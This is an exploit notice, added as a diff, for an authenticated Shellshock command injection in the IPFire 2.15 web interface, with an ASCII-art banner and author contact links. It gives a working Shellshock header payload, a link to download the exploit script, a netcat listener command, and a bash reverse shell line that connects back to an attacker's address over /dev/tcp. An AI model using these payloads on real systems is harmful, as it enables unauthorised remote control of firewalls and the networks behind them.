@@ -1,0 +1,51 @@
+       ___ _______ _______ __                _______       __
+      |   |   _   |   _   |__.----.-----.   |   _   .-----|__|
+      |.  |.  1   |.  1___|  |   _|  -__|   |.  1___|  _  |  |
+      |.  |.  ____|.  __) |__|__| |_____|   |.  |___|___  |__|
+      |:  |:  |   |:  |                     |:  1   |_____|
+      |::.|::.|   |::.|                     |::.. . |
+      `---`---'   `---'                     `-------'
+   _______ __          __ __ _______ __               __
+  |   _   |  |--.-----|  |  |   _   |  |--.-----.----|  |--.
+  |   1___|     |  -__|  |  |   1___|     |  _  |  __|    <
+  |____   |__|__|_____|__|__|____   |__|__|_____|____|__|__|
+  |:  1   |                 |:  1   |
+  |::.. . |                 |::.. . |
+  `-------'                 `-------'
+
+                                IPFire <= 2.15 c0re 82 Authenticated
+                                Cgi Sh3llSh0ck r3m0t3 C0mm4nd Inj3ct10n
+
+                          Written by:
+
+                        Claudio Viviani
+
+                     http://www.homelab.it
+
+                        info@homelab.it
+                    homelabit@protonmail.ch
+
+               https://www.facebook.com/homelabit
+                  https://twitter.com/homelabit
+               https://plus.google.com/+HomelabIt1/
+     https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww
+
+
+# Requirements:
+
+  1) Python 2.4/2.6
+
+  2) IPFire Webgui account
+
+
+# Exploitation via Tamper
+
+  () { :;}; echo "H0m3l4b1t"; /bin/bash -c "touch /tmp/aaaa"
+
+# Exploitation via ipfire_cgi_shellshock.py
+
+  1) Download: http://www.homelab.it/wp-content/uploads/2014/09/ipfire_cgi_shellshock.py_.txt
+
+  2) Open a simple socket server with netcat on client: nc -l 55555
+
+  3) Inject reverse shell: bash -i >& /dev/tcp/10.0.0.63/55555 0>&1 
